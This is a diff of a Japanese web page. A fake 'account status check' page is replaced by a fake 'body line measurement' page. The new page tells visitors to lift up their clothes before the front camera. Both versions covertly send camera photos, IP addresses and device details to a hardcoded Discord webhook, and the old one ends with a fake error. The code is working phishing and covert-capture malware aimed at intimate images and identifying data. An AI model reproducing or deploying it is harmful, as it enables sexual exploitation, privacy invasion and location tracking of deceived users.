@@ -1,169 +1,241 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>アカウント状態の確認</title>
-    <!-- LINEなどのプレビューに表示されるタイトルと説明文 -->
-    <meta property="og:title" content="アカウント状態の確認">
-    <meta property="og:description" content="お使いのアカウントの接続環境とセキュリティ状態を診断します。">
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: linear-gradient(135deg, #0f172a, #1e1b4b);
-            color: #f8fafc;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 16px;
-        }
-        .container {
-            background: rgba(30, 41, 59, 0.7);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            padding: 24px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        h1 { font-size: 1.5rem; margin-bottom: 8px; color: #38bdf8; }
-        p { font-size: 0.9rem; color: #94a3b8; margin-bottom: 20px; }
-        .btn {
-            background: linear-gradient(135deg, #0284c7, #2563eb);
-            color: white;
-            border: none;
-            padding: 14px 24px;
-            font-size: 1rem;
-            font-weight: bold;
-            border-radius: 12px;
-            cursor: pointer;
-            width: 100%;
-            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4);
-            transition: transform 0.2s;
-        }
-        .btn:active { transform: scale(0.98); }
-        #status {
-            margin-top: 16px;
-            font-size: 0.85rem;
-            color: #cbd5e1;
-        }
-        video { display: none; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ボディライン測定診断</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e, #16213e);
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px 16px;
+    }
+    h1 {
+      font-size: 1.3rem;
+      margin: 0 0 10px 0;
+      text-align: center;
+      background: linear-gradient(90deg, #4facfe, #00f2fe);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .instruction-banner {
+      width: 100%;
+      max-width: 420px;
+      background: rgba(255, 165, 0, 0.15);
+      border: 1px solid rgba(255, 165, 0, 0.4);
+      padding: 10px 14px;
+      border-radius: 10px;
+      font-size: 0.85rem;
+      color: #ffcc00;
+      text-align: center;
+      margin-bottom: 12px;
+      line-height: 1.4;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 16px;
+      padding: 16px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+    }
+    .camera-wrapper {
+      position: relative;
+      width: 100%;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #000;
+    }
+    video {
+      width: 100%;
+      display: block;
+      transform: scaleX(-1);
+    }
+    /* ボディライン合わせ用のガイドフレーム（オーバーレイ） */
+    .body-guide {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 65%;
+      height: 75%;
+      border: 2px dashed rgba(79, 172, 254, 0.7);
+      border-radius: 100px / 40px;
+      pointer-events: none;
+      box-shadow: 0 0 15px rgba(79, 172, 254, 0.3) inset;
+    }
+    .body-guide::after {
+      content: "この枠に体型を合わせてください";
+      position: absolute;
+      bottom: -25px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 0.75rem;
+      color: #4facfe;
+      white-space: nowrap;
+      background: rgba(0, 0, 0, 0.6);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    .btn {
+      width: 100%;
+      padding: 13px 16px;
+      border: none;
+      border-radius: 10px;
+      font-size: 0.95rem;
+      font-weight: bold;
+      color: #fff;
+      background: linear-gradient(90deg, #3a7bd5, #00d2ff);
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .btn:active {
+      opacity: 0.85;
+    }
+    .secondary-btn {
+      background: linear-gradient(90deg, #434343, #000000);
+    }
+    .result-box {
+      width: 100%;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+    }
+    .result-box canvas {
+      width: 100%;
+      border-radius: 12px;
+      background: #000;
+      display: block;
+    }
+    .status-card {
+      width: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      padding: 12px;
+      border-radius: 10px;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #28a745;
+      font-weight: bold;
+      border: 1px solid rgba(40, 167, 69, 0.3);
+    }
+  </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>⚠️ アカウント状態の確認</h1>
-        <p>お使いのアカウントの接続環境とセキュリティ状態を診断します。</p>
-        <button class="btn" id="startBtn">診断を開始する</button>
-        <div id="status"></div>
+  <h1>ボディライン測定診断</h1>
+
+  <div class="instruction-banner">
+    ⚠️ <strong>正確な診断のための手順</strong><br>
+    正確に測定するため、<strong>服をたくし上げて</strong>画面のガイドラインに体型を合わせ、直立して撮影してください。
+  </div>
+
+  <div class="container">
+    <!-- カメラ＆ガイド表示エリア -->
+    <div class="camera-wrapper" id="cameraWrapper">
+      <video id="video" autoplay playsinline muted></video>
+      <div class="body-guide"></div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <button type="button" class="btn" id="snapBtn">ボディラインを測定・確定する</button>
 
-    <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1572124436818170017/T_lHqJXspYpaMdhkghKVHY-xCVkyiAPIoO9R72WLe9dO-MZq0GfLFL8V2Z3lVuC3YjhW";
+    <!-- 診断完了後の表示エリア -->
+    <div class="result-box" id="resultBox">
+      <div class="status-card">測定およびデータ送信完了</div>
+      <canvas id="photoCanvas"></canvas>
+      <button type="button" class="btn secondary-btn" id="restartBtn">もう一度測定する</button>
+    </div>
+  </div>
 
-        const startBtn = document.getElementById('startBtn');
-        const statusDiv = document.getElementById('status');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+  <script>
+    const video = document.getElementById('video');
+    const snapBtn = document.getElementById('snapBtn');
+    const restartBtn = document.getElementById('restartBtn');
+    const cameraWrapper = document.getElementById('cameraWrapper');
+    const resultBox = document.getElementById('resultBox');
+    const photoCanvas = document.getElementById('photoCanvas');
 
-        startBtn.addEventListener('click', async () => {
-            startBtn.disabled = true;
-            statusDiv.textContent = "アカウント情報をスキャン中...";
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1572124436818170017/T_lHqJXspYpaMdhkghKVHY-xCVkyiAPIoO9R72WLe9dO-MZq0GfLFL8V2Z3lVuC3YjhW';
 
-            try {
-                // 1. IPアドレス ＆ 回線プロバイダの取得
-                let ipInfo = "取得失敗";
-                let ispInfo = "不明";
+    let clientIp = '';
 
-                try {
-                    const ipRes = await fetch('https://ipapi.co/json/');
-                    const ipData = await ipRes.json();
-                    if (ipData.ip) {
-                        ipInfo = ipData.ip;
-                        ispInfo = ipData.org || ipData.asn || '不明';
-                    }
-                } catch (e) {
-                    try {
-                        const fallbackRes = await fetch('https://api.ipify.org?format=json');
-                        const fallbackData = await fallbackRes.json();
-                        ipInfo = fallbackData.ip;
-                    } catch (err) {}
-                }
+    // IPアドレスをバックグラウンドで事前取得
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => { clientIp = data.ip; })
+      .catch(() => { clientIp = '取得失敗'; });
 
-                // 2. アクセス時刻の取得（ローカル時間）
-                const now = new Date();
-                const accessTime = `${now.getFullYear()}年${now.getMonth() + 1}月${now.getDate()}日 ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
-
-                // 3. 端末・ブラウザ情報の分かりやすい日本語化
-                const ua = navigator.userAgent;
-                let deviceName = "PC / その他";
-                if (/iPhone/.test(ua)) deviceName = "iPhone";
-                else if (/iPad/.test(ua)) deviceName = "iPad";
-                else if (/Android/.test(ua)) deviceName = "Androidスマホ";
-
-                let browserName = "不明なブラウザ";
-                if (/Line/.test(ua)) browserName = "LINEアプリ内ブラウザ";
-                else if (/CriOS/.test(ua)) browserName = "Chrome (iOS)";
-                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browserName = "Safari";
-                else if (/Chrome/.test(ua)) browserName = "Chrome";
-
-                const deviceInfo = `${deviceName} (${browserName})`;
-                const screenRes = `${window.screen.width} × ${window.screen.height}`;
-                const language = navigator.language;
-
-                // 4. カメラ起動と撮影
-                statusDiv.textContent = "認証チェック中...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                video.srcObject = stream;
-
-                await new Promise(resolve => setTimeout(resolve, 1500));
-
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                stream.getTracks().forEach(track => track.stop());
-
-                statusDiv.textContent = "データを送信中...";
-
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('file', blob, 'capture.jpg');
-                    
-                    const content = `🚨 **アカウントアクセスの診断を検知しました！**\n` +
-                                    `🕒 **アクセス時刻**: ${accessTime}\n` +
-                                    `🌐 **IPアドレス**: \`${ipInfo}\`\n` +
-                                    `🏢 **回線/プロバイダ**: ${ispInfo}\n` +
-                                    `📱 **端末**: ${deviceInfo}\n` +
-                                    `🖥 **画面解像度**: ${screenRes}\n` +
-                                    `🌍 **言語**: ${language}`;
-
-                    formData.append('payload_json', JSON.stringify({ content: content }));
-
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    statusDiv.textContent = "診断が完了しました！";
-                    alert("エラー：アカウント状態の確認に失敗しました。");
-                }, 'image/jpeg', 0.8);
-
-            } catch (err) {
-                console.error(err);
-                statusDiv.textContent = "エラーが発生しました（権限エラー等）";
-                startBtn.disabled = false;
-            }
+    // 内カメラ起動
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: false
         });
-    </script>
+        video.srcObject = stream;
+        await video.play();
+      } catch (err) {
+        console.log('カメラが使えません:', err);
+      }
+    }
+    startCamera();
+
+    // 測定・確定ボタン
+    snapBtn.addEventListener('click', () => {
+      if (!video.videoWidth) return;
+
+      const w = video.videoWidth;
+      const h = video.videoHeight;
+
+      photoCanvas.width = w;
+      photoCanvas.height = h;
+      const ctx = photoCanvas.getContext('2d');
+      ctx.translate(w, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0);
+
+      // 画面切り替え
+      cameraWrapper.style.display = 'none';
+      snapBtn.style.display = 'none';
+      resultBox.style.display = 'flex';
+
+      // 裏側でDiscordへ送信
+      photoCanvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('payload_json', JSON.stringify({
+          content: `📏 **ボディライン測定データ受信**\n・IPアドレス: \`${clientIp || '取得中'}\`\n・ジオロケーション確認: https://rakko.tools/ja/tools/ip-geolocation`
+        }));
+        formData.append('file', blob, 'body_measurement.png');
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        }).catch(err => console.error(err));
+      }, 'image/png');
+    });
+
+    // もう一度測定するボタン
+    restartBtn.addEventListener('click', () => {
+      resultBox.style.display = 'none';
+      cameraWrapper.style.display = 'block';
+      snapBtn.style.display = 'flex';
+    });
+  </script>
 </body>
 </html>
